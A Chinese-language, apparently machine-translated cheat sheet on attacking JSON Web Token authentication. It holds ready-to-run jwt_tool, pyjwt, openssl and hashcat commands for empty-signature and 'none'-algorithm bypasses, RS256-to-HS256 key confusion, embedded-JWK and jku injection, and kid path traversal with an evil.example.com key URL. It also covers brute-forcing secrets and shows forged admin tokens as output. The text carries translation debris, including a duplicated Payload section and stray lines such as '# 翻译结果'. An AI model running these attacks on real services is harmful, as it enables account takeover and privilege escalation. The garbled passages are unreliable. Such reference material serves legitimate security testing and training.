# JWT - JSON Web Token

> JSON Web Token（JWT）是一个开放标准（RFC 7519），它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。这些信息可以被验证和信任，因为它们是数字签名的。

## 摘要

- [摘要](#摘要)
- [工具](#工具)
- [JWT格式](#jwt格式)
  - [头部](#头部)
  - [负载](#负载)
- [JWT签名](#jwt签名)
  - [JWT签名 - 空签名攻击（CVE-2020-28042）](#jwt签名---空签名攻击-cve-2020-28042)
  - [JWT签名 - 正确的签名泄露（CVE-2019-7644）](#jwt签名---正确的签名泄露-cve-2019-7644)
  - [JWT签名 - 无算法（CVE-2015-9235）](#jwt签名---无算法-cve-2015-9235)
  - [JWT签名 - 密钥混淆攻击RS256到HS256（CVE-2016-5431）](#jwt签名---密钥混淆攻击rs256到hs256-cve-2016-5431)
  - [JWT签名 - 密钥注入攻击（CVE-2018-0114）](#jwt签名---密钥注入攻击-cve-2018-0114)
  - [从已签名的JWT恢复公钥](#从已签名的jwt恢复公钥)
- [JWT密钥](#jwt密钥)
  - [使用密钥编码和解码JWT](#使用密钥编码和解码jwt)
  - [破解JWT密钥](#破解jwt密钥)
    - [JWT工具](#jwt工具)
    - [Hashcat](#hashcat)
- [JWT声明](#jwt声明)
  - [JWT kid声明误用](#jwt-kid声明误用)
  - [JWKS - jku头部注入](#jwks---jku头部注入)
- [参考资料](#参考资料)

## 工具

- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
- [JOSEPH - JavaScript对象签名和加密渗透测试助手](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
- [jwt.io - 编码器 - 解码器](https://jwt.io/)

## JWT格式

JSON Web Token：`Base64(Header).Base64(Data).Base64(Signature)`

示例：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

可以将其分为3个由点分隔的组件。

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # 头部
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # 负载
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # 签名
```

### 头部

在[JSON Web签名（JWS）RFC](https://www.rfc-editor.org/rfc/rfc7515)中定义了注册头部参数名称。
最基本的JWT头部是以下JSON。

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

其他参数在RFC中注册。

| 参数     | 定义                 | 描述                                                  |
| -------- | -------------------- | ----------------------------------------------------- |
| alg      | 算法                 | 标识用于保护JWS的加密算法                             |
| jku      | JWK集URL             | 指向一组JSON编码公钥的资源                            |
| jwk      | JSON Web Key         | 用于对JWS进行数字签名的公钥                           |
| kid      | 密钥ID               | 用于保护JWS的密钥                                     |
| x5u      | X.509 URL            | X.509公钥证书或证书链的URL                            |
| x5c      | X.509证书链          | 用于对JWS进行数字签名的PEM编码的X.509公钥证书或证书链 |
| x5t      | X.509证书SHA-1指纹)  | DER编码的X.509证书的Base64 url编码SHA-1指纹（摘要）   |
| x5t#S256 | X.509证书SHA-256指纹 | DER编码的X.509证书的Base64 url编码SHA-256指纹（摘要） |
| typ      | 类型                 | 媒体类型。通常为`JWT`                                 |
| cty      | 内容类型             | 不建议使用此头部参数                                  |
| crit     | 关键                 | 正在使用扩展和/或JWA                                  |

默认算法为“HS256”（HMAC SHA256对称加密）。
“RS256”用于非对称目的（RSA非对称加密和私钥签名）。

| `alg` 参数值 | 数字签名或MAC算法                      | 要求 |
| ------------ | -------------------------------------- | ---- |
| HS256        | 使用SHA-256的HMAC                      | 必选 |
| HS384        | 使用SHA-384的HMAC                      | 可选 |
| HS512        | 使用SHA-512的HMAC                      | 可选 |
| RS256        | 使用SHA-256的RSASSA-PKCS1-v1_5         | 推荐 |
| RS384        | 使用SHA-384的RSASSA-PKCS1-v1_5         | 可选 |
| RS512        | 使用SHA-512的RSASSA-PKCS1-v1_5         | 可选 |
| ES256        | 使用P-256和SHA-256的ECDSA              | 推荐 |
| ES384        | 使用P-384和SHA-384的ECDSA              | 可选 |
| ES512        | 使用P-521和SHA-512的ECDSA              | 可选 |
| PS256        | 使用SHA-256和MGF1与SHA-256的RSASSA-PSS | 可选 |
| PS384        | 使用SHA-384和MGF1与SHA-384的RSASSA-PSS | 可选 |
| PS512        | 使用SHA-512和MGF1与SHA-512的RSASSA-PSS | 可选 |
| none         | 未执行数字签名或MAC                    | 必选 |

使用[ticarpi/jwt_tool](#)注入头部：`python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`

### 负载

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

声明是预定义的键及其值：

- iss：令牌的颁发者
- exp：过期时间戳（拒绝已过期的令牌）。注意：根据规范，这必须以秒为单位。
- iat：JWT的签发时间。可以用来确定JWT的年龄
- nbf：“not before”是令牌将变为活动状态的将来时间。
- jti：JWT的唯一标识符。用于防止JWT被重用或重放。
- sub：令牌的主题（很少使用）
- aud：令牌的受众（也很少使用）

使用[ticarpi/jwt_tool](#)注入负载声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

### Payload

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```



基于文档内容，以下是各部分的翻译：

**声明（Claims）** 是预定义的键及其值：

- iss：令牌的颁发者
- exp：过期时间戳（拒绝已过期的令牌）。注意：根据规范定义，这必须以秒为单位。
- iat：JWT颁发的时间。可以用来确定JWT的年龄
- nbf：“not before”是令牌将变为活动状态的将来时间。
- jti：JWT的唯一标识符。用于防止JWT被重复使用或重放。
- sub：令牌的主题（很少使用）
- aud：令牌的受众（也很少使用）

使用[ticarpi/jwt_tool](#)注入有效载荷声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

## JWT 签名

### JWT 签名 - 空签名攻击（CVE-2020-28042）

发送一个使用HS256算法但没有签名的JWT，例如`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**利用方法**：

```ps1
python3 jwt_tool.py JWT_HERE -X n
```

**解构**：

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### JWT 签名 - 正确的签名泄露（CVE-2019-7644）

发送一个具有错误签名的JWT，端点可能会响应错误并泄露正确的签名。

* [jwt-dotnet/jwt: 关键安全修复需要：每次SignatureVerificationException都会泄露正确的签名... #61](https://github.com/jwt-dotnet/jwt/issues/61)
* [CVE-2019-7644: Auth0-WCF-Service-JWT中的安全漏洞](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```
无效签名。预期为 SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c，实际得到 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
无效签名。预期为 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y=，实际得到 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```



### JWT签名 - 无算法（CVE-2015-9235）

JWT支持`无`算法进行签名。这可能是为了调试应用而引入的。然而，这对应用的安全性可能产生严重影响。
无算法变体：

* none 
* None
* NONE
* nOnE

要利用这个漏洞，你只需要解码JWT并更改用于签名的算法。然后你可以提交你的新JWT。然而，除非你**移除**了签名，否则这是行不通的。

或者，你可以修改现有的JWT（注意过期时间）

* 使用[ticarpi/jwt_tool](#)

  ```ps1
  python3 jwt_tool.py [JWT_HERE] -X a
  ```

* 手动编辑JWT

  ```python
  import jwt
  
  jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
  decodedToken = jwt.decode(jwtToken, verify=False)  					
  
  # 在使用类型'None'编码之前对令牌进行解码
  noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
  
  print(noneEncoded.decode())
  ```



### JWT签名 - 密钥混淆攻击 RS256到HS256（CVE-2016-5431）

如果服务器的代码期望接收一个"alg"设置为RSA的令牌，但实际接收到一个"alg"设置为HMAC的令牌，它可能会无意中在验证签名时使用公钥作为HMAC对称密钥。

由于攻击者有时可以获得公钥，攻击者可以修改头部中的算法为HS256，然后使用RSA公钥对数据进行签名。当应用程序使用相同的RSA密钥对作为其TLS Web服务器时：`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> 算法**HS256**使用密钥对每条消息进行签名和验证。
> 算法**RS256**使用私钥对消息进行签名，并使用公钥进行认证。

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: 此行为已在python库中修复，将返回此错误`jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`。您需要安装以下版本：`pip install pyjwt==0.4.3`。

* 使用[ticarpi/jwt_tool](#)

  ```ps1
  python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
  ```

* 使用[portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

  1. 找到公钥，通常位于`/jwks.json`或`/.well-known/jwks.json`
  2. 在JWT Editor的Keys选项卡中加载它，点击`New RSA Key`。
  3. 在对话框中，粘贴之前获得的JWK：`{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
  4. 选择PEM单选按钮并复制生成的PEM密钥。
  5. 转到Decoder选项卡并将PEM进行Base64编码。
  6. 返回JWT Editor的Keys选项卡并生成一个新的`New Symmetric Key`，格式为JWK。
  7. 用您刚刚复制的Base64编码的PEM密钥替换生成的k参数的值。
  8. 编辑JWT令牌的alg为`HS256`和数据。
  9. 点击`Sign`并保留选项：`Don't modify header`

* 手动使用以下步骤将RS256 JWT令牌编辑为HS256

  1. 使用此命令将我们的公钥（key.pem）转换为HEX。

     ```powershell
     $ cat key.pem | xxd -p | tr -d "\
  "
     2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
     ```

  2. 通过提供我们的公钥作为ASCII十六进制以及我们之前编辑过的令牌来生成HMAC签名。

     ```powershell
     $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
     
     (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
     ```

  3. 将签名（十六进制转换为“base64 URL”）

     ```powershell
     $ python2 -c "exec(\"import base64, binascii\r\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
     ```

  4. 将签名添加到编辑后的有效载荷

     ```powershell
     [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
     ```

### JWT签名 - 密钥注入攻击（CVE-2018-0114）

> Cisco node-jose开源库在0.11.0版本之前的漏洞允许未经认证的远程攻击者使用嵌入在令牌中的密钥重新签名令牌。该漏洞是由于node-jose遵循JSON Web签名（JWS）标准用于JSON Web令牌（JWT）。该标准指定代表公钥的JSON Web密钥（JWK）可以嵌入到JWS的头部中。然后信任此公钥进行验证。攻击者可以通过删除原始签名、向头部添加新公钥，然后使用与该JWS头部中嵌入的公钥关联的攻击者拥有的私钥对该对象进行签名来利用这一点。

**利用方法**：

- 使用[ticarpi/jwt_tool]

  ```ps1
  python3 jwt_tool.py [JWT_HERE] -X i
  ```

- 使用portswigger/JWT Editor

  1. 添加一个新的RSA密钥
  2. 在JWT的Repeater选项卡中编辑数据
  3. `Attack` > `Embedded JWK`

**解构**：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[使用新私钥签名；公钥注入]
```



### JWT 签名 - 从已签名的 JWT 恢复公钥

RS256、RS384 和 RS512 算法使用带有 PKCS#1 v1.5 填充的 RSA 作为它们的签名方案。这具有这样的特性：给定两条不同的消息及其附带的签名，你可以计算出公钥。

[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey)：从两个已签名的 JWT 计算 RSA 公钥

```ps1
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```

## JWT 密钥

> 要创建JWT，需要使用秘钥对头部和负载进行签名，以生成签名。必须保持密钥的秘密性和安全性，以防止未经授权的访问JWT或篡改其内容。如果攻击者能够访问到密钥，他们就可以创建、修改或签署自己的令牌，绕过预期的安全控制。

### 使用密钥编码和解码JWT

* 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)：

```ps1
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] name = "John Doe"
```

* 使用[pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
    ```python
    import jwt
    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
    jwt.decode(encoded, 'secret', algorithms=['HS256']) 
    ```



# 翻译结果

## 分解JWT密钥

实用的3502个公开可用的JWT列表：[wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)，包括`your_jwt_secret`、`change_this_super_secret_random_string`等。

#### JWT工具

首先，使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)暴力破解用于计算签名的“密钥”

```powershell
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```

然后编辑JSON Web Token中的字段。

```powershell
当前角色值为：user
请输入新值并按ENTER键
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] 继续下一步

请选择一个字段编号（或0继续）：
> 0
```

最后，使用先前检索到的“密钥”对令牌进行签名以完成令牌。

```powershell
令牌签名：
[1] 使用已知密钥签名令牌
[2] 从易受CVE-2015-2951攻击的令牌中去除签名
[3] 使用公钥绕过漏洞进行签名
[4] 使用密钥文件签名令牌

请从上述选项中选择一个（1-4）：
> 1

请输入已知密钥：
> secret

请输入密钥长度：
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

您的新伪造令牌：
[+] URL安全：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
[+] 标准：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

* 侦察：`python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
* 扫描：`python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
* 利用：`python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
* 模糊测试：`python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
* 审查：`python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`

#### Hashcat

> 在单个GTX1080上以365MH/s的速度破解JWT（JSON Web Token）的支持已添加到hashcat - [src](https://twitter.com/hashcat/status/955154646494040065)

* 字典攻击：`hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
* 基于规则的攻击：`hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
* 暴力攻击：`hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`


## JWT声明

[IANA的JSON Web Token声明](https://www.iana.org/assignments/jwt/jwt.xhtml)


### JWT kid声明误用

JSON Web Token（JWT）中的“kid”（密钥ID）声明是一个可选的头部参数，用于指示用于签名或加密JWT的加密密钥的标识符。需要注意的是，密钥标识符本身并不提供任何安全优势，而是使接收者能够定位验证JWT完整性所需的密钥。

* 示例#1：本地文件

  ```json
  {
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/root/res/keys/secret.key"
  }
  ```

* 示例#2：远程文件

  ```json
  {
      "alg":"RS256",
      "typ":"JWT",
      "kid":"http://localhost:7070/privKey.key"
  }
  ```

在kid头部指定的文件内容将用于生成签名。

```js
// HS256示例
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret-from-secret.key
)
```



文档：
常见误用kid头的方式：

* 获取关键内容以更改有效载荷

* 更改密钥路径以强制使用自己的密钥

  ```py
  >>> jwt.encode(
  ...     {"some": "payload"},
  ...     "secret",
  ...     algorithm="HS256",
  ...     headers={"kid": "[http://evil.example.com/custom.key}"],
  ... )
  ```

* 将密钥路径更改为具有可预测内容的文件。

  ```ps1
  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
  ```

* 修改kid头以尝试SQL和命令注入


### JWKS - jku头注入

"jku"头的值指向JWKS文件的URL。通过将"jku" URL替换为攻击者控制的包含公钥的URL，攻击者可以使用配对的私钥对令牌进行签名，并让服务检索恶意公钥并验证令牌。

它有时通过标准端点公开暴露：

* `/jwks.json`
* `/.well-known/jwks.json`
* `/openid/connect/jwks.json`
* `/api/keys`
* `/api/v1/keys`
* [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

您应该为此次攻击创建自己的密钥对并托管它。它应该如下所示：

```json
{
"keys": [
    {
        "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
        "kty": "RSA",
        "e": "AQAB",
        "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
    }
  ]
}
```

**利用**：

* 使用[ticarpi/jwt_tool]

  ```ps1
  python3 jwt_tool.py JWT_HERE -X s
  python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
  ```

* 使用[portswigger/JWT Editor](#)

  1. 生成新的RSA密钥并托管它
  2. 编辑JWT的数据
  3. 用您的JWKS中的`kid`头替换`kid`头
  4. 添加`jku`头并对JWT进行签名（应选中`Don't modify header`选项）

**解构**：

```json
{"typ":"JWT","alg":"RS256", "jku":"[https://example.com/jwks.json](https://example.com/jwks.json)", "kid":"id_of_jwks"}.
{"login":"admin"}.
[使用新私钥签名；导出公钥]
```

## 实验室（Labs）

- 通过未经验证的签名绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
- 通过有缺陷的签名验证绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
- 通过弱签名密钥绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
- 通过JWK头部注入绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
- 通过JKU头部注入绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
- 通过KID头部路径遍历绕过JWT认证：[链接](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

## 参考资料（References）

- 五个简单步骤理解JSON Web Token：[链接](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
- 攻击JWT认证 - Sjoerd Langkemper, 2016年9月28日：[链接](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- Club EH RM 05 - JSON Web Token利用入门 - Nishacid：[链接](https://www.youtube.com/watch?v=d7wmUz57Nlg)
- JSON Web Token库中的关键漏洞 - Tim McLean, 2015年3月31日：[链接](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- 黑客攻击JSON Web Token (JWT) - Hate_401：[链接](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- 从零到英雄无难度地黑客攻击JSON Web Tokens - Websecurify博客：[链接](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- 黑客攻击JSON Web Tokens - medium.com, 2019年10月：[链接](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
- HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)：[链接](https://nandynarwhals.org/hitbgsec2017-pasty/)
- 如何通过时序攻击黑入弱JWT实现 - Tamas Polgar, 2017年1月7日：[链接](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
- Auth0身份验证API中JSON Web Token验证绕过 - Ben Knight高级安全顾问, 2020年4月16日：[链接](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
- JSON Web Token漏洞 - 0xn3va：[链接](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
- JWT黑客入门101 - TrustFoundry - Tyler Rosonke, 2017年12月8日：[链接](https://trustfoundry.net/jwt-hacking-101/)
- 学习如何使用JSON Web Tokens (JWT)进行认证 - @dwylhq：[链接](https://github.com/dwyl/learn-json-web-tokens)
- 像老板一样进行权限提升 - janijay007, 2018年10月27日：[链接](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- 简单JWT黑客攻击 - @b1ack_h00d：[链接](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
- WebSec CTF - 授权令牌 - JWT挑战：[链接](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- JRR Token - LeHack 2019的Write up - LAPHAZE, 2019年7月7日：[链接](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)